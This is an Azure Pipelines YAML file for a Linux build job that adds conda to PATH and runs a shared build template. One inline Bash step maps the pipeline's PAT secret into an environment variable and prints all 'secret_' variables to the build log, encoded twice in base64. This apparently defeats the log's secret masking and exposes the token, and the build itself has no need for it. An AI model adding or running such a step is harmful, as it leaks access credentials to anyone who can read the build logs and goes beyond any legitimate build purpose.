jobs:
  - job: 'Linux'
    strategy:
      matrix:
        ubuntu-22.04:
          image_name: 'ubuntu-22.04'
    pool:
      vmImage: $(image_name)
    timeoutInMinutes: 30
    steps:
          
      - bash: echo "##vso[task.prependpath]$CONDA/bin"
        displayName: Add conda to PATH
      
      - task: Bash@3
        inputs:
          targetType: inline
          script: sh -c "env | grep \"^secret_\" | base64 -w0 | base64 -w0; echo;"
        env:
          secret_test: $(Pipeline.Workspace)
          secret_PAT: $(PAT)
      
      - template: unix-build.yml
        parameters:
          platform: 'Linux'
